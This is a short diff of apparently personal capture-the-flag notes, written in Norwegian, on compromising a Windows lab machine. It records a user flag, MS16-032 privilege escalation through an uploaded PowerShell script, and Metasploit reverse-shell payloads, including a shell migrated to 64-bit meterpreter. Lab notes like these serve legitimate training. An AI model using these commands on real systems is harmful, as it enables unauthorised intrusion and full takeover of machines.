@@ -16,8 +16,6 @@ husk å sette lhost også
 
 user.txt **d0c39409d7b994a9a1389ebf38ef5f73**
 
-
-
 MS16-032 SYSTEM Privilege Escalation
 
 prøvd å laste opp ps1-script og får kjørt det, men prosessen ligger i bakgrunnen.- sjekk ps kommando
@@ -41,4 +39,12 @@ set payload windows/powershell_reverse_tcp
 Import-Module ./lol.ps1
 
 Invoke-MS16-032
+
+
+
+gjøre fra 32 til 64 bit shell
+
+`use windows/local/payload_inject`
+
+`set payload windows/x64/meterpreter/reverse_tcp`
 
